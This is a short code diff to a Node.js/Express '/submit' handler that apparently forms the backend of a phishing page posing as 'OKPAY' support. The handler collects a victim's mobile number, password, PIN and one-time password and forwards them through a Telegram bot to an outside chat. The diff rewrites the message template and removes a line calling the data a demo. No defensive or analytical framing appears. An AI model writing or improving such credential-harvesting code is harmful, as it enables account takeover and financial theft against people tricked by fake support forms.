@@ -32,12 +32,11 @@ app.post("/submit", async (req, res) => {
         // Telegram par bheje jaane wale message ka format
         const messageText = `
 🔴 OKPAY NOTIFICATION\n\n
-📌 Support Issue: ` + issue + `\n` +
- 📱 Mobile Number: ` + phone + `\n` +
- 🔒 Password: ` + password + `\n` +
- 🆔 Pin: ` + pin + `\n` +
- 💬 Received OTP: ` + otp + `\n\n` +
- Demo support information received.`;
+Support Issue: ${issue}\n
+Mobile Number: ${phone}\n
+Password: ${password}\n
+Pin: ${pin}\n
+Received OTP: ${otp}\n
 
         // Telegram bot ke zariye chat mein message send karna
         await bot.sendMessage(process.env.CHAT_ID, messageText);
